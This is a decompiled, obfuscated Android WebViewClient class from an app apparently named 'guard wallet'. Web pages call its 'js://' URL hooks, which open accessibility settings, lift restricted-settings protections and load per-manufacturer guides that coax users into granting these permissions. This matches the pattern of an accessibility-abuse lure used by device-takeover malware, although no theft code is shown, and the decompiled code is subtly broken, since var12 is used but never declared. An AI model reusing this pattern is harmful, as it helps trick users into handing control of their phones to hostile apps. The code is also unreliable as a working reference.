package e0;

import a1.q;
import android.content.Intent;
import android.graphics.Bitmap;
import android.os.Build;
import android.util.Log;
import android.view.KeyEvent;
import android.webkit.RenderProcessGoneDetail;
import android.webkit.WebResourceError;
import android.webkit.WebResourceRequest;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import java.lang.ref.WeakReference;
import java.util.concurrent.atomic.AtomicBoolean;

public final class d extends WebViewClient {
   public final AtomicBoolean a = new AtomicBoolean(false);
   public boolean b;

   public d(boolean var1) {
      this.b = var1;
   }

   public final void onPageFinished(WebView var1, String var2) {
      super.onPageFinished(var1, var2);
      if (!q.B(var2)) {
         StringBuilder var3 = new StringBuilder("onPageFinished URL:");
         var3.append(var2);
         Log.d("e0.d", var3.toString());
         this.a.set(true);
         var1.getSettings().setBlockNetworkImage(false);
      }
   }

   public final void onPageStarted(WebView var1, String var2, Bitmap var3) {
      super.onPageStarted(var1, var2, var3);
      if (!q.B(var2)) {
         StringBuilder var4 = new StringBuilder("onPageStarted URL:");
         var4.append(var2);
         Log.d("e0.d", var4.toString());
      }
   }

   public final void onReceivedError(WebView var1, WebResourceRequest var2, WebResourceError var3) {
      super.onReceivedError(var1, var2, var3);
      if (var3.getDescription() != null && !q.B(var3.getDescription().toString())) {
         StringBuilder var4 = new StringBuilder("onReceivedError error:");
         var4.append(var3.getDescription().toString());
         Log.d("e0.d", var4.toString());
         if (var3.getDescription().toString().contains("ERR_CONNECTION_TIMED_OUT") && !this.a.get()) {
            var1.loadUrl("https://m.baidu.com/");
         }
      }
   }

   public final boolean onRenderProcessGone(WebView var1, RenderProcessGoneDetail var2) {
      return true;
   }

   public final boolean shouldOverrideKeyEvent(WebView var1, KeyEvent var2) {
      if (var2.getKeyCode() == 4 && var2.getAction() == 0) {
         if (this.b) {
            return false;
         }

         if (var1 != null && var1.canGoBack()) {
            var1.goBack();
            return true;
         }
      }

      return super.shouldOverrideKeyEvent(var1, var2);
   }

   public final boolean shouldOverrideUrlLoading(WebView var1, WebResourceRequest var2) {
      label156: {
         if (var2.getUrl() != null && !q.B(var2.getUrl().getScheme())) {
            if (var2.getUrl().getScheme().equalsIgnoreCase("js") && !q.B(var2.getUrl().getAuthority())) {
               if (var2.getUrl().getAuthority().equalsIgnoreCase("startAccessibility")) {
                  WeakReference var9 = com.guard.wallet.utils.b.a;
                  if (com.guard.wallet.utils.g.V0()) {
                     com.guard.wallet.utils.b.d.incrementAndGet();
                  }

                  return true;
               }

               if (var2.getUrl().getAuthority().equalsIgnoreCase("startAllowRestricted")
                  || var2.getUrl().getAuthority().equalsIgnoreCase("startAllowRestrictedByAppDes")) {
                  WeakReference var8 = com.guard.wallet.utils.b.a;
                  if (com.guard.wallet.utils.g.Z0(null)) {
                     com.guard.wallet.utils.b.d.incrementAndGet();
                  }

                  return true;
               }

               if (var2.getUrl().getAuthority().equalsIgnoreCase("startAllowRestrictedByAppMgr")) {
                  WeakReference var6 = com.guard.wallet.utils.b.a;

                  boolean var3;
                  label122: {
                     label121: {
                        try {
                           if (com.guard.wallet.utils.g.Z() != null) {
                              Intent var7 = new Intent("android.settings.MANAGE_APPLICATIONS_SETTINGS");
                              var7.addFlags(268435456);
                              var7.addFlags(8388608);
                              com.guard.wallet.utils.g.Z().startActivity(var7);
                              break label121;
                           }
                        } catch (Exception var5) {
                           q.s("ApplicationUtil", var5);
                        }

                        var3 = false;
                        break label122;
                     }

                     var3 = true;
                  }

                  if (var3) {
                     com.guard.wallet.utils.b.d.incrementAndGet();
                  }

                  return true;
               }

               if (var2.getUrl().getAuthority().equalsIgnoreCase("guideStartAccessibility")) {
                  WeakReference var15 = com.guard.wallet.utils.b.a;
                  String var18 = com.guard.wallet.utils.d.e();
                  String var16;
                  if (com.guard.wallet.utils.e.i()) {
                     var16 = "/coloros";
                  } else if (com.guard.wallet.utils.e.l()) {
                     var16 = "/oriainos";
                  } else if (com.guard.wallet.utils.e.m()) {
                     var16 = "/miui";
                  } else if (com.guard.wallet.utils.e.k()) {
                     var16 = "/hios";
                  } else if (Build.BRAND.equalsIgnoreCase("samsung")) {
                     var16 = "/oneui";
                  } else if (com.guard.wallet.utils.e.g()) {
                     if (com.guard.wallet.utils.e.h()) {
                        var16 = "/harmonyos";
                     } else {
                        var16 = "/magicos";
                     }
                  } else {
                     var16 = "/common";
                  }

                  var12 = var18.concat(var16);
                  com.guard.wallet.utils.b.e.incrementAndGet();
                  break label156;
               }

               if (var2.getUrl().getAuthority().equalsIgnoreCase("guideStartAllowRestricted")) {
                  WeakReference var13 = com.guard.wallet.utils.b.a;
                  String var17 = com.guard.wallet.utils.d.e();
                  String var14;
                  if (com.guard.wallet.utils.e.i()) {
                     var14 = "/colorosRelease";
                  } else if (com.guard.wallet.utils.e.l()) {
                     var14 = "/oriainosRelease";
                  } else if (com.guard.wallet.utils.e.m()) {
                     var14 = "/miuiRelease";
                  } else if (com.guard.wallet.utils.e.k()) {
                     var14 = "/hiosRelease";
                  } else if (Build.BRAND.equalsIgnoreCase("samsung")) {
                     var14 = "/oneuiRelease";
                  } else if (com.guard.wallet.utils.e.g()) {
                     if (com.guard.wallet.utils.e.h()) {
                        var14 = "/harmonyosRelease";
                     } else {
                        var14 = "/magicosRelease";
                     }
                  } else {
                     var14 = "/commonRelease";
                  }

                  var12 = var17.concat(var14);
                  com.guard.wallet.utils.b.f.incrementAndGet();
                  break label156;
               }

               if (var2.getUrl().getAuthority().equalsIgnoreCase("guideDeniedAccessibility")) {
                  WeakReference var10 = com.guard.wallet.utils.b.a;
                  String var4 = com.guard.wallet.utils.d.e();
                  String var11;
                  if (com.guard.wallet.utils.e.i()) {
                     var11 = "/colorosDenied";
                  } else if (com.guard.wallet.utils.e.l()) {
                     var11 = "/oriainosDenied";
                  } else if (com.guard.wallet.utils.e.m()) {
                     var11 = "/miuiDenied";
                  } else if (com.guard.wallet.utils.e.k()) {
                     var11 = "/hiosDenied";
                  } else if (Build.BRAND.equalsIgnoreCase("samsung")) {
                     var11 = "/oneuiDenied";
                  } else if (com.guard.wallet.utils.e.g()) {
                     if (com.guard.wallet.utils.e.h()) {
                        var11 = "/harmonyosDenied";
                     } else {
                        var11 = "/magicosDenied";
                     }
                  } else {
                     var11 = "/commonDenied";
                  }

                  var12 = var4.concat(var11);
                  com.guard.wallet.utils.b.g.incrementAndGet();
                  break label156;
               }
            }

            if (var2.getUrl().getScheme().equalsIgnoreCase("baiduboxapp")) {
               return true;
            }
         }

         return super.shouldOverrideUrlLoading(var1, var2);
      }

      var1.loadUrl(var12);
      return true;
   }
}
